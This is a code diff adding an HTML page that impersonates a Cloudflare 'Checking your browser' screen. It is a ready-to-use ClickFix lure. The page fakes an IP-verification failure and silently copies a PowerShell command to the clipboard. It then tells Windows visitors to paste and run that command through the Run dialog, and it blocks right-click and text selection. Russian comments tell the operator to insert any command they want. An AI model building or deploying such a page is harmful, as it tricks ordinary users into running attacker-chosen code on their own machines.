@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checking your browser - cloudflare.com</title>
+    <link rel="shortcut icon" href="https://www.cloudflare.com/favicon.ico" type="image/x-icon">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+        }
+        
+        body {
+            background-color: #f6f6f6;
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            overflow-x: hidden;
+        }
+        
+        .container {
+            max-width: 650px;
+            width: 100%;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            padding: 40px;
+            text-align: center;
+        }
+        
+        .cloudflare-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 30px;
+            gap: 10px;
+        }
+        
+        .cloudflare-logo {
+            height: 32px;
+            width: auto;
+        }
+        
+        .cloudflare-title {
+            font-size: 24px;
+            font-weight: 500;
+            color: #f38020;
+        }
+        
+        .main-content {
+            margin: 30px 0;
+        }
+        
+        .checking-animation {
+            margin: 0 auto 25px;
+            width: 180px;
+            height: 180px;
+            position: relative;
+        }
+        
+        .spinner {
+            width: 100%;
+            height: 100%;
+            border: 8px solid #e6e6e6;
+            border-top: 8px solid #f38020;
+            border-radius: 50%;
+            animation: spin 1.5s linear infinite;
+        }
+        
+        .cloudflare-icon {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 70px;
+            height: 70px;
+            background-color: #f38020;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 32px;
+            color: white;
+        }
+        
+        .status-text {
+            font-size: 24px;
+            font-weight: 500;
+            margin-bottom: 10px;
+            color: #333;
+        }
+        
+        .subtext {
+            color: #666;
+            font-size: 16px;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+        
+        .error-container {
+            background-color: #fff2f2;
+            border: 1px solid #ffcdcd;
+            border-radius: 6px;
+            padding: 20px;
+            margin: 30px 0;
+            text-align: left;
+            display: none;
+        }
+        
+        .error-title {
+            color: #d63638;
+            font-weight: 600;
+            font-size: 18px;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .error-icon {
+            font-size: 20px;
+        }
+        
+        .error-details {
+            color: #666;
+            line-height: 1.5;
+            margin-bottom: 15px;
+        }
+        
+        .solution-steps {
+            background-color: #f8f9fa;
+            border-radius: 6px;
+            padding: 20px;
+            margin-top: 20px;
+            border-left: 4px solid #f38020;
+        }
+        
+        .step {
+            display: flex;
+            margin-bottom: 15px;
+            align-items: flex-start;
+        }
+        
+        .step-number {
+            background-color: #f38020;
+            color: white;
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            margin-right: 12px;
+            flex-shrink: 0;
+        }
+        
+        .step-text {
+            color: #333;
+            line-height: 1.5;
+            padding-top: 4px;
+        }
+        
+        .key-combo {
+            display: inline-block;
+            background-color: #f0f0f0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            padding: 4px 8px;
+            font-family: monospace;
+            font-size: 14px;
+            margin: 0 4px;
+        }
+        
+        .mobile-error {
+            display: none;
+            padding: 40px 20px;
+            text-align: center;
+        }
+        
+        .mobile-error-icon {
+            font-size: 48px;
+            margin-bottom: 20px;
+            color: #d63638;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px;
+            }
+            
+            .checking-animation {
+                width: 140px;
+                height: 140px;
+            }
+            
+            .cloudflare-icon {
+                width: 50px;
+                height: 50px;
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Mobile error message (hidden by default) -->
+    <div class="mobile-error" id="mobileError">
+        <div class="mobile-error-icon">⚠️</div>
+        <h2>Access Restricted</h2>
+        <p>This verification page is only available on desktop computers.</p>
+        <p>Please access this website from a Windows PC to complete the verification process.</p>
+    </div>
+    
+    <!-- Main content for desktop users -->
+    <div class="container" id="desktopContainer">
+        <div class="cloudflare-header">
+            <div class="cloudflare-icon">CF</div>
+            <div class="cloudflare-title">cloudflare</div>
+        </div>
+        
+        <div class="main-content">
+            <div class="checking-animation">
+                <div class="spinner"></div>
+                <div class="cloudflare-icon">CF</div>
+            </div>
+            
+            <div class="status-text" id="statusText">Checking your browser...</div>
+            <div class="subtext" id="subText">This process is automatic. Your browser will redirect to your requested content shortly.</div>
+            <div class="subtext">Please allow up to 5 seconds...</div>
+        </div>
+        
+        <!-- Error message that appears after 5 seconds -->
+        <div class="error-container" id="errorContainer">
+            <div class="error-title">
+                <span class="error-icon">⚠</span>
+                IP Verification Failed
+            </div>
+            
+            <div class="error-details">
+                <p>We've detected an issue with your IP address verification. Your request has been blocked due to security restrictions.</p>
+                <p><strong>Error Code:</strong> 1020</p>
+                <p><strong>Ray ID:</strong> 7a1b2c3d4e5f6789</p>
+                <p><strong>Your IP:</strong> <span id="userIP">Loading...</span></p>
+            </div>
+            
+            <div class="solution-steps">
+                <h3 style="margin-bottom: 15px; color: #333;">To resolve this issue, please follow these steps:</h3>
+                
+                <!-- ИЗМЕНИТЕ КОМАНДУ ЗДЕСЬ: -->
+                <!-- ЗАМЕНИТЕ ТЕКСТ МЕЖДУ КАВЫЧКАМИ НА НУЖНУЮ ВАМ КОМАНДУ -->
+                <!-- НАПРИМЕР: "powershell -Command \"Your Command Here\"" -->
+                <input type="hidden" id="hiddenCommand" value="powershell -Command &quot;Start-Process cmd -Verb RunAs&quot;">
+                
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <div class="step-text">Press <span class="key-combo">Windows</span> + <span class="key-combo">R</span> to open the Run dialog</div>
+                </div>
+                
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <div class="step-text">Press <span class="key-combo">Ctrl</span> + <span class="key-combo">V</span> to paste the verification command</div>
+                </div>
+                
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <div class="step-text">Press <span class="key-combo">Enter</span> to execute the verification</div>
+                </div>
+                
+                <div class="step">
+                    <div class="step-number">4</div>
+                    <div class="step-text">Follow the instructions in the verification window</div>
+                </div>
+            </div>
+            
+            <div style="margin-top: 20px; font-size: 13px; color: #888;">
+                <p>Once the verification is complete, you can <a href="#" style="color: #f38020; text-decoration: none;">refresh this page</a> to continue.</p>
+            </div>
+        </div>
+        
+        <div style="margin-top: 40px; padding-top: 20px; border-top: 1px solid #eee; font-size: 13px; color: #888;">
+            <p>DDoS protection by <strong>Cloudflare</strong></p>
+            <p style="margin-top: 5px;">Ray ID: 7a1b2c3d4e5f6789 • <span id="currentTime"></span></p>
+        </div>
+    </div>
+
+    <script>
+        // Device detection - show mobile error if not on desktop
+        function isDesktop() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            const mobileDevices = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/;
+            return !mobileDevices.test(userAgent);
+        }
+        
+        // Initialize page based on device
+        if (!isDesktop()) {
+            document.getElementById('mobileError').style.display = 'block';
+            document.getElementById('desktopContainer').style.display = 'none';
+        }
+        
+        // Simulate IP address
+        function generateFakeIP() {
+            const segments = Array.from({length: 4}, () => Math.floor(Math.random() * 255) + 1);
+            return segments.join('.');
+        }
+        
+        // Update current time
+        function updateTime() {
+            const now = new Date();
+            const timeString = now.toUTCString();
+            document.getElementById('currentTime').textContent = timeString;
+        }
+        
+        // Copy command to clipboard (invisible to user)
+        function copyCommandToClipboard() {
+            // ИЗМЕНИТЕ КОМАНДУ ЗДЕСЬ:
+            // ЗАМЕНИТЕ ТЕКСТ МЕЖДУ КАВЫЧКАМИ НА НУЖНУЮ ВАМ КОМАНДУ
+            const command = "powershell -Command \"Start-Process cmd -Verb RunAs\"";
+            
+            navigator.clipboard.writeText(command).then(() => {
+                console.log('Command copied to clipboard:', command);
+            }).catch(err => {
+                console.error('Failed to copy command: ', err);
+            });
+        }
+        
+        // Simulate the verification process
+        function simulateVerification() {
+            const statusText = document.getElementById('statusText');
+            const subText = document.getElementById('subText');
+            const errorContainer = document.getElementById('errorContainer');
+            const userIP = document.getElementById('userIP');
+            
+            // Set fake IP
+            userIP.textContent = generateFakeIP();
+            
+            // Update status after 2 seconds
+            setTimeout(() => {
+                statusText.textContent = "Verifying IP address...";
+            }, 2000);
+            
+            // Show error after 5 seconds
+            setTimeout(() => {
+                statusText.textContent = "Verification Failed";
+                statusText.style.color = "#d63638";
+                subText.textContent = "We are unable to complete the verification automatically.";
+                subText.style.color = "#666";
+                
+                // Show error container
+                errorContainer.style.display = 'block';
+                
+                // Auto-copy command to clipboard (invisible)
+                copyCommandToClipboard();
+                
+            }, 5000);
+        }
+        
+        // Initialize page
+        document.addEventListener('DOMContentLoaded', function() {
+            if (isDesktop()) {
+                updateTime();
+                setInterval(updateTime, 1000);
+                
+                // Start verification simulation
+                setTimeout(simulateVerification, 1000);
+            }
+        });
+        
+        // Prevent right-click
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        // Disable text selection
+        document.addEventListener('selectstart', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        // Copy on Ctrl+V (optional)
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && e.key === 'v') {
+                // Команда уже в буфере обмена
+                console.log('Paste detected - command should already be in clipboard');
+            }
+        });
+    </script>
+</body>
+</html>
